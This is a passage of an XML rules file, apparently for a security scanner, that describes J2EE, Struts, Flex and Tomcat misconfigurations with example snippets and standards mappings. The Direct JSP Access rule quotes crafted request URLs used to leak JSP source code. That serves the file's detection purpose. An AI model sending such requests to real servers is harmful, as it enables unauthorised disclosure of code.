many times the dependency is retrieved in order to compromise the machine on which the build is occurring.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_classloader_manipulation_struts_1</key>
		<internalKey>Environment/ClassLoader Manipulation/Struts 1
		</internalKey>
		<name>ClassLoader Manipulation: Struts 1</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <Paragraph>Struts 1 applications that use <code>ActionForms</code> are vulnerable to ClassLoader manipulation.</Paragraph>
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ClassLoader manipulation allows an attacker to access and modify the underlying application server settings. On certain applications servers like Tomcat 8, an attacker can tweak these settings to upload a web shell and execute arbitrary commands.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 470</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12]  <em>Protect your Struts1 applications</em> Alvaro Muñoz<br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_flex_misconfiguration_debug_information</key>
		<internalKey>Environment/Flex Misconfiguration/Debug Information
		</internalKey>
		<name>Flex Misconfiguration: Debug Information</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debugging information helps attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If you are using Blaze DS to perform logging of any unexpected events, the <code>services-config.xml</code> descriptor file specifies a "Logging" XML element to describe various aspects of logging. It looks something like this:<br><br><b>Example:</b><br><pre><br>&lt;logging&gt;<br>    &lt;target class="flex.messaging.log.ConsoleTarget" level="Debug"&gt;<br>        &lt;properties&gt;<br>            &lt;prefix&gt;[BlazeDS]&lt;/prefix&gt;<br>            &lt;includeDate&gt;false&lt;/includeDate&gt;<br>            &lt;includeTime&gt;false&lt;/includeTime&gt;<br>            &lt;includeLevel&gt;false&lt;/includeLevel&gt;<br>            &lt;includeCategory&gt;false&lt;/includeCategory&gt;<br>        &lt;/properties&gt;<br>        &lt;filters&gt;<br>            &lt;pattern&gt;Endpoint.*&lt;/pattern&gt;<br>            &lt;pattern&gt;Service.*&lt;/pattern&gt;<br>            &lt;pattern&gt;Configuration&lt;/pattern&gt;<br>        &lt;/filters&gt;<br>    &lt;/target&gt;<br>&lt;/logging&gt;<br></pre><br><br>This <code>target</code> tag takes an optional attribute called <code>level</code>, which indicates the log level. If the debug level is set to too detailed a level, your application may write sensitive data to the log file.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 11</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_insecure_deployment_java_applet</key>
		<internalKey>Environment/Insecure Deployment/Java Applet</internalKey>
		<name>Insecure Deployment: Java Applet</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Use of Java applets could lead to sensitive information disclosure.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programmer's often entrust the applet code with sensitive information without realising that applets can be easily decompiled and can expose any sensitive data hardcoded in the code. An attacker could decompile the applet and gain access to confidential information, including any hard-coded passwords and keys, within the applet. Java applets pose various risks including:<br><br>	-  Intellectual property theft <br>	-  Understanding of the security controls used implemented by the application <br>	-  Extraction of confidential information, such as hard-coded passwords and keys<br>	-  Malicious alterations to the code with the purpose of compromising unsuspecting application users
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_cookies_disabled</key>
		<internalKey>Environment/J2EE Misconfiguration/Cookies Disabled
		</internalKey>
		<name>J2EE Misconfiguration: Cookies Disabled</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program does not use cookies to transmit session identifiers, which can leave the door open to Session Fixation and Session Hijacking attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most web applications use a session identifier to uniquely identify users, which is typically stored in a cookie and transmitted transparently between the server and the web browser.<br>  <br><br>Applications that do not store session identifiers in cookies sometimes transmit them as an HTTP request parameter or as part of the URL. Accepting session identifiers specified in URLs makes it easy for attackers to perform Session Fixation attacks.<br><br>Placing session identifiers in URLs can also increase the chances of successful Session Hijacking attacks against the application. Session Hijacking occurs when an attacker takes control of a victim's active session or session identifier. It is common practice for web servers, application servers, and web proxies to store requested URLs. If session identifiers are included in URLs, they are also logged. Increasing the number of places session identifiers are viewed and stored increases the chances they will be compromised by an attacker.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3090 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3405 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3405 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3405 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3405 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 384</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>
																									   <p>[18]  <em>Session Fixation</em> Fortify, An HP Company<br></p>
																									   <p>[19]  <em>The Context Container</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_debug_information</key>
		<internalKey>Environment/J2EE Misconfiguration/Debug Information
		</internalKey>
		<name>J2EE Misconfiguration: Debug Information</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Tomcat debug level of 3 or greater could cause sensitive data, including passwords, to be logged.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If you are using Tomcat to perform authentication, the Tomcat deployment descriptor file specifies a "Realm" used for authentication. It looks something like this:<br><br><b>Example:</b><br><pre><br>  &lt;Realm className="org.apache.catalina.realm.JAASRealm"<br>         appName="SRN"<br>         userClassNames="com.srn.security.UserPrincipal"<br>         roleClassNames="com.srn.security.RolePrincipal"/&gt;<br></pre><br><br>This <code>Realm</code> tag takes an optional attribute called <code>debug</code>, which indicates the log level. The higher the number, the more verbose the log messages. If the debug level is set too high, Tomcat will write all usernames and passwords in plaintext to the log file. The cutoff for debugging messages related to Tomcat's <code>JAASRealm</code> is 3 (3 or above is bad, 2 or below is okay), but this cutoff may vary for the other types of realms that Tomcat provides.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 215</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_direct_jsp_access</key>
		<internalKey>Environment/J2EE Misconfiguration/Direct JSP Access
		</internalKey>
		<name>J2EE Misconfiguration: Direct JSP Access</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Direct access to Java Server Pages can lead to system information leak, source code disclosure and even arbitrary code execution.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Directly accessing Java Server Pages (JSPs) in applications built using web frameworks, such as Struts or Spring, that use actions or servlets to delegate requests to JSPs can result in unhandled exceptions and system information leaks. Poorly implemented or configured application servers have been co-opted into leaking source code details using specially crafted requests, such as <code>http://host/page.jsp%00</code> or <code>http://host/page.js%2570</code>. Even worse, if an application permits users to upload arbitrary files, attackers can use this mechanism to upload malicious code in the form of a JSP and request the uploaded page to cause the malicious code to execute on the server.<br><br><br><br><b>Example 1:</b> The following example shows a poorly constructed security constraint that explicitly allows direct access to JSPs with a '*' in the role name, which indicates that all users are allowed access the corresponding web resources.<br><pre><br>&lt;security-constraint&gt;<br>    &lt;web-resource-collection&gt;<br>        &lt;web-resource-name&gt;JSP Access for Everyone!&lt;/web-resource-name&gt;<br>        &lt;description&gt;Allow any user/role access to JSP&lt;/description&gt;<br>        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;<br>    &lt;/web-resource-collection&gt;<br>    &lt;auth-constraint&gt;<br>        &lt;role-name&gt;*&lt;/role-name&gt;<br>    &lt;/auth-constraint&gt;<br>&lt;/security-constraint&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[13] Jordan Dimov <em>JSP Security</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1, Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1, Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_duplicate_security_role</key>
		<internalKey>Environment/J2EE Misconfiguration/Duplicate Security Role
		</internalKey>
		<name>J2EE Misconfiguration: Duplicate Security Role</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple security roles with the same name exist. Duplicate security roles often indicate left over debug code or a typographical error.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Duplicate security roles serve no purpose since only the last definition of a given security role will be applied.<br><br><br><b>Example 1:</b> The entry from a <code>web.xml</code> file defines two <code>admin</code> roles.<br><pre><br>&lt;security-constraint&gt;<br>    &lt;web-resource-collection&gt;<br>        &lt;web-resource-name&gt;AdminPage&lt;/web-resource-name&gt;<br>        &lt;description&gt;Admin only pages&lt;/description&gt;<br>        &lt;url-pattern&gt;/auth/noaccess/*&lt;/url-pattern&gt;<br>    &lt;/web-resource-collection&gt;<br>    &lt;auth-constraint&gt;<br>        &lt;description&gt;Administrators only&lt;/description&gt;<br>        &lt;role-name&gt;admin&lt;/role-name&gt;<br>    &lt;/auth-constraint&gt;<br>&lt;/security-constraint&gt;<br>...<br>&lt;security-role&gt;<br>    &lt;description&gt;Administrator&lt;/description&gt;<br>    &lt;role-name&gt;admin&lt;/role-name&gt;<br>&lt;/security-role&gt;<br><br>&lt;security-role&gt;<br>    &lt;description&gt;Non-Administrator&lt;/description&gt;<br>    &lt;role-name&gt;admin&lt;/role-name&gt;<br>&lt;/security-role&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[3] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_duplicate_servlet_mapping</key>
		<internalKey>Environment/J2EE Misconfiguration/Duplicate Servlet
			Mapping
		</internalKey>
		<name>J2EE Misconfiguration: Duplicate Servlet Mapping</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple servlet mappings for the same URL pattern exist. Duplicate servlet mappings often indicate left over debug code or a typographical error.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Duplicate servlet mappings serve no purpose since only the last entry will be applied when the same URL pattern is used in multiple servlet mappings.<br><br><br><br><b>Example 1:</b> In the following example, the URL pattern <code>/servletA/*</code> is used in two different servlet mappings.<br><pre><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;ServletA&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/servletA/*&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;ServletB&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/servletA/*&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_excessive_servlet_mappings
		</key>
		<internalKey>Environment/J2EE Misconfiguration/Excessive Servlet
			Mappings
		</internalKey>
		<name>J2EE Misconfiguration: Excessive Servlet Mappings</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple URL patterns map to a single Servlet, which often indicates poor a architecture or a lack of standardization.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Multiple URL patterns that map to a single Servlet could be a sign that the Servlet performs too many functions.<br><br><br><br><b>Example 1:</b> The following example maps five URL patterns to a single Servlet.<br><pre><br>&lt;servlet&gt;<br>    &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;<br>    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/helloworld*&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/servlet*&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/mservlet*&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[3] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_excessive_session_timeout</key>
		<internalKey>Environment/J2EE Misconfiguration/Excessive Session
			Timeout
		</internalKey>
		<name>J2EE Misconfiguration: Excessive Session Timeout</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An overly long session timeout gives attackers more time to potentially compromise user accounts.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The longer a session stays open, the larger the window of opportunity an attacker has to compromise user accounts. While a session remains active, an attacker may be able to brute force a user's password, crack a user's wireless encryption key, or commandeer a session from an open browser. Longer session timeouts can also prevent memory from being released and eventually result in a denial of service if a sufficiently large number of sessions are created.<br><br><b>Example 1:</b> If the session timeout is zero or less than zero, the session never expires. The following example shows a session timeout set to -1, which will cause the session to remain active indefinitely.<br><pre><br>&lt;session-config&gt;<br>    &lt;session-timeout&gt;-1&lt;/session-timeout&gt;<br>&lt;/session-config&gt;<br></pre><br><br>The <code>&lt;session-timeout&gt;</code> tag defines the default session timeout interval for all sessions in the web application. If the <code>&lt;session-timeout&gt;</code> tag is missing, it is left to the container to set the default timeout.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-12 Session Termination (P2)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3415 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3415 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3415 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3415 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3415 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 613</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Session Expiration</em> <br></p>
																									   <p>[14] Sun Microsystems, Inc. <em>Java Servlet Specification 2.4</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10, Requirement 8.1.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3, Requirement 8.5.15</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 8.5.15</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 8.5.15</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_j2ee_misconfiguration_incomplete_error_handling</key>
